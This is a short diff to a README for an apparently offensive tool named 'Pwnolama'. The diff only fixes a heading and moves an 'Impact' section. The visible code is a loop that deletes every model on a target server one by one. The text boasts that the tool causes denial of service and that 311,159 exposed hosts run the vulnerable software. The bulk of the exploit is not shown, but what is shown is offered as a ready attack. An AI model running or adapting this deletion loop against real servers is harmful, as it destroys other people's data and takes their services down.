@@ -1,4 +1,4 @@
-# pwnolama
+# Pwnolama
 Using this we can delete all the existing models and cause DOS right now 311,159 hosts are running this software.
 
 ```
@@ -69,7 +69,6 @@ while True:
     for model in models:
         delete(model)
         time.sleep(1)  # Optional delay to avoid rapid requests
-
-Impact
-Using this we can delete all the existing models and cause DOS right now 311,159 hosts are running this software.
 ```
+### Impact
+Using this we can delete all the existing models and cause DOS right now 311,159 hosts are running this software.
